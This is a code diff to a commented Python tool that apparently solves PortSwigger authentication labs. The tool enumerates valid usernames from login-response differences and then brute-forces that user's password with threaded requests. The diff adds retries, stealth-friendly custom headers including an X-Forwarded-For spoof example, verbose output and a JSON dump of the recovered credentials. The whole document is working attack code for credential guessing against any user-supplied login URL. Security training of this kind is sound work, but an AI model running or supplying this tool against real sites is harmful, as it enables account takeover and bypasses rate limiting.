@@ -177,11 +177,13 @@ import re                                    # regex - extracts error msg + CSRF
 import sys                                   # used for sys.exit() to bail with a nonzero exit code
 import time                                  # used for time.sleep() in jitter
 from collections import Counter              # counts how many times each unique value appears
+import json                                  # for --output (write results summary as JSON)
+import threading                             # threading.Lock for the "first verbose dump" race
 from concurrent.futures import (             # high-level threading API
     ThreadPoolExecutor,                      # manages a pool of worker threads
     as_completed,                            # yields futures in the order they finish
 )
-from dataclasses import dataclass            # tidy config-object container
+from dataclasses import dataclass, field     # tidy config-object container
 from pathlib import Path                     # nicer file-path object than raw strings
 from urllib.parse import urlparse            # validates the user-supplied lab URL
 
@@ -190,6 +192,7 @@ import requests                              # popular HTTP client library
 import urllib3                               # `requests` ships with this - used to silence
                                              # the InsecureRequestWarning when we proxy through Burp
 from requests.adapters import HTTPAdapter    # lets us tune the connection pool
+from urllib3.util.retry import Retry         # auto-retry on connection errors / 5xx
 
 
 # ---------------------------------------------------------------------
@@ -235,12 +238,25 @@ class AttackConfig:
     dummy_password: str                 # the junk password used during Phase 1
     proxy: str | None                   # if set, route requests through this proxy URL (e.g. Burp)
     insecure: bool                      # if True, skip TLS verification (auto-on when proxy is set)
+    retries: int                        # how many times to retry on connection errors / 5xx
+    verbose: bool                       # if True, print every probe + dump the first one in full
+    output: Path | None                 # if set, write a JSON summary to this file
+    # Custom headers applied to every request (e.g. Authorization, X-Forwarded-For).
+    # `field(default_factory=list)` is the way to give a dataclass a default that's
+    # a mutable object - using `= []` directly would share one list across instances.
+    extra_headers: list[tuple[str, str]] = field(default_factory=list)
 
 
 # ---------------------------------------------------------------------
 # SESSION + REQUEST HELPERS
 # ---------------------------------------------------------------------
-def build_session(workers: int, proxy: str | None = None, insecure: bool = False) -> requests.Session:
+def build_session(
+    workers: int,
+    proxy: str | None = None,
+    insecure: bool = False,
+    retries: int = 0,
+    extra_headers: list[tuple[str, str]] | None = None,
+) -> requests.Session:
     """
     Build a requests.Session tuned for fast parallel use, optionally
     routed through an upstream proxy (e.g. Burp Suite).
@@ -282,10 +298,34 @@ def build_session(workers: int, proxy: str | None = None, insecure: bool = False
     """
     s = requests.Session()
 
+    # ---- Retry policy (when retries > 0) ----
+    # urllib3.Retry plugs into HTTPAdapter and automatically retries
+    # on the conditions you list. We use it for:
+    #   - connection errors (ConnectionError, DNS failure, reset)
+    #   - 502 / 503 / 504 (transient infra errors)
+    # `backoff_factor=0.5` means exponentially increasing waits between
+    # attempts: ~0s, 1s, 2s, 4s, ...
+    # `allowed_methods` includes POST because in this attack context
+    # we WANT POSTs retried on transient failure (login is idempotent
+    # from the attacker's perspective - we just want the response).
+    # `raise_on_status=False` lets us see the final 5xx instead of
+    # raising an exception on it.
+    retry = Retry(
+        total=retries,
+        backoff_factor=0.5,
+        status_forcelist=[502, 503, 504],
+        allowed_methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"],
+        raise_on_status=False,
+    )
+
     # pool_connections = how many distinct hostname pools we keep
     # pool_maxsize    = max simultaneous connections per host pool
     # We size both to `workers` so the pool exactly matches concurrency.
-    adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers)
+    adapter = HTTPAdapter(
+        pool_connections=workers,
+        pool_maxsize=workers,
+        max_retries=retry,
+    )
     s.mount("http://", adapter)     # apply to all http:// URLs
     s.mount("https://", adapter)    # apply to all https:// URLs
 
@@ -296,6 +336,15 @@ def build_session(workers: int, proxy: str | None = None, insecure: bool = False
     # one for authorized testing so blue teams can tell your traffic
     # apart from real attackers.
     s.headers.update({"User-Agent": "portswigger-lab-solver/1.0"})
+
+    # Apply any custom headers the user passed via -H. These go on the
+    # Session, so they're included on every request automatically
+    # (including the GET in the CSRF flow). Later .update() calls win
+    # over earlier ones, so a user-supplied User-Agent overrides our
+    # default - which is what they probably wanted.
+    if extra_headers:
+        for name, val in extra_headers:
+            s.headers[name] = val
 
     # ---- proxy + TLS configuration ----
     if proxy:
@@ -340,7 +389,10 @@ def get_session(cfg: AttackConfig, shared: requests.Session | None) -> requests.
         # is going to be used for exactly one request and then
         # garbage-collected. We still forward proxy + insecure so
         # fresh sessions also route through Burp if configured.
-        return build_session(workers=1, proxy=cfg.proxy, insecure=cfg.insecure)
+        return build_session(
+            workers=1, proxy=cfg.proxy, insecure=cfg.insecure,
+            retries=cfg.retries, extra_headers=cfg.extra_headers,
+        )
     return shared
 
 
@@ -493,7 +545,10 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
     # If we're sharing a Session across all workers, build it once.
     # If --fresh-session is set, each probe builds its own and `shared`
     # is None.
-    shared = None if cfg.fresh_session else build_session(cfg.workers, cfg.proxy, cfg.insecure)
+    shared = None if cfg.fresh_session else build_session(
+        cfg.workers, cfg.proxy, cfg.insecure,
+        retries=cfg.retries, extra_headers=cfg.extra_headers,
+    )
 
     # `results` maps each username to its response fingerprint:
     #   {
@@ -506,10 +561,12 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
     def probe(u: str):
         """
         Run by each worker thread. Sends one login attempt and
-        returns (username, status, body_length, error_msg).
+        returns (username, status, body_length, error_msg, body).
 
         Defined INSIDE enumerate_username so it has automatic access
-        to `cfg` and `shared` via closure.
+        to `cfg` and `shared` via closure. We carry the raw body
+        back too - it's only needed for --verbose first-dump, but
+        passing it through is harmless (each response is ~3 KB).
         """
         maybe_jitter(cfg)                          # stealth delay (if any)
         sess = get_session(cfg, shared)            # shared or brand-new
@@ -518,7 +575,12 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
         # len(r.content) counts BYTES of the raw response body. We use
         # raw bytes (not characters) because that's what server-side
         # response-length comparisons are typically done on.
-        return u, r.status_code, len(r.content), extract_error(r.text)
+        return u, r.status_code, len(r.content), extract_error(r.text), r.text
+
+    # `first_dumped` tracks whether we've already shown the full
+    # response of the first probe in verbose mode. Read/written only
+    # from the MAIN thread (the as_completed loop), so no lock needed.
+    first_dumped = False
 
     # ThreadPoolExecutor manages a pool of cfg.workers threads.
     # The `with` block ensures threads are joined + cleaned up on exit.
@@ -533,8 +595,19 @@ def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
         #   3. fut.result() unwraps the return value of probe()
         #         (or re-raises any exception probe() threw).
         for fut in as_completed([ex.submit(probe, u) for u in usernames]):
-            u, status, length, msg = fut.result()
+            u, status, length, msg, body = fut.result()
             results[u] = (status, length, msg)
+
+            if cfg.verbose:
+                print(f"    probe {u!r}: status={status} len={length} msg={msg!r}")
+                if not first_dumped:
+                    # First response gets a full body dump so the user can
+                    # eyeball it and confirm the script is talking to the
+                    # right lab and parsing the right HTML.
+                    print(f"    --- first probe body (truncated to 2 KB) ---")
+                    print("    " + body[:2000].replace("\n", "\n    "))
+                    print("    --- end of first probe body ---")
+                    first_dumped = True
 
     # -----------------------------------------------------------------
     # OUTLIER DETECTION
@@ -605,7 +678,10 @@ def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> st
     every probe to finish.
     """
     print(f"[*] phase 2: trying {len(passwords)} passwords against {username!r}")
-    shared = None if cfg.fresh_session else build_session(cfg.workers, cfg.proxy, cfg.insecure)
+    shared = None if cfg.fresh_session else build_session(
+        cfg.workers, cfg.proxy, cfg.insecure,
+        retries=cfg.retries, extra_headers=cfg.extra_headers,
+    )
     found: str | None = None
 
     def probe(p: str):
@@ -621,6 +697,9 @@ def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> st
 
         for fut in as_completed(futures):
             p, status, location = fut.result()
+
+            if cfg.verbose:
+                print(f"    probe pw={p!r}: status={status}")
 
             # HTTP 302 = redirect = successful login. The server is
             # sending us to /my-account (or whatever the Location
@@ -746,7 +825,50 @@ def main():
              "(or trust) the upstream proxy.",
     )
 
+    # ---- Reliability + observability (Tier 2) ----
+    ap.add_argument(
+        "-H", "--header",
+        action="append",
+        default=[],
+        metavar="NAME:VALUE",
+        help="Extra header sent on every request (repeatable). Examples: "
+             "-H 'Authorization: Bearer eyJ...' "
+             "-H 'X-Forwarded-For: 127.0.0.1'",
+    )
+    ap.add_argument(
+        "--verbose",
+        action="store_true",
+        help="Print every probe (not just the final result) and dump the "
+             "first probe's full response body so you can sanity-check "
+             "the lab is responding as expected.",
+    )
+    ap.add_argument(
+        "--retries",
+        type=int,
+        default=2,
+        help="Retry count on connection errors / transient 5xx responses "
+             "(default 2). Set to 0 to disable retries.",
+    )
+    ap.add_argument(
+        "--output",
+        type=Path,
+        metavar="FILE.json",
+        help="Write a JSON summary (lab URL, username fingerprints, valid "
+             "username, password, final credentials) to this file.",
+    )
+
     args = ap.parse_args()
+
+    # ---- Parse -H / --header arguments into (name, value) pairs ----
+    # `requests` is tolerant of bad header values but we still split on
+    # the first colon so a value containing ':' (e.g. a Bearer token
+    # with timestamps) isn't truncated.
+    extra_headers: list[tuple[str, str]] = []
+    for raw in args.header:
+        if ":" not in raw:
+            sys.exit(f"--header must look like 'Name: Value', got {raw!r}")
+        name, val = raw.split(":", 1)
+        extra_headers.append((name.strip(), val.strip()))
 
     # ---- Resolve proxy shorthand + auto-enable insecure ----
     # `--proxy burp` -> the default Burp listener address.
@@ -792,6 +914,10 @@ def main():
         dummy_password=args.dummy_password,
         proxy=proxy,
         insecure=insecure,
+        retries=args.retries,
+        verbose=args.verbose,
+        output=args.output,
+        extra_headers=extra_headers,
     )
 
     # ---- Load wordlists from disk ----
@@ -813,6 +939,23 @@ def main():
     # ---- Final output ----
     print()
     print(f"=== credentials: {user}:{pw} ===")
+
+    # ---- Optional JSON summary on disk ----
+    # Writing a structured summary lets you script around the solver:
+    # feed `credentials` into a subsequent tool, or grep many runs.
+    if cfg.output is not None:
+        summary = {
+            "lab_url": cfg.base_url,
+            "valid_username": user,
+            "password": pw,
+            "credentials": f"{user}:{pw}",
+            "workers": cfg.workers,
+            "csrf": cfg.use_csrf,
+            "proxy": cfg.proxy,
+        }
+        # `indent=2` makes it human-readable; drop it for compact output.
+        cfg.output.write_text(json.dumps(summary, indent=2) + "\n")
+        print(f"[*] wrote summary to {cfg.output}")
 
 
 # Standard Python idiom: only run main() if this file is executed
